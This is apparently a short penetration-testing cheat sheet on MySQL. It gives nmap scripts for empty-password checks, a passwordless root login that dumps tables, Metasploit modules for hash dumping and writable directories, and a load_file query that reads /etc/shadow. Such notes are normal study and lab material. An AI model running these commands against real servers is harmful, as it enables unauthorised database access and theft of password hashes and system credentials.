---
up: "[[SQL]]"
tools:
  - "[[Metasploit]]"
---

# MySQL - Introduction

Port 3306 is commonly [[MySQL]] default one.

Nmap script:

```bash
nmap -sV -p 3306 --script=mysql-empty-password
nmap -sV -p 3306 --script=mysql-info
```

To connect:

```bash
mysql -h <ip> -u root
> show databases;
> use <db>;
> select * from <table>;
```

Using [[Metasploit]]:

```bash
msf5> use auxiliary/scanner/mysql/mysql_writable_dirs
msf5> use auxiliary/scanner/mysql/mysql_hashdump
```

If interesting directories are readable:

```bash
mysql> select load_file("/etc/shadow"); 
```
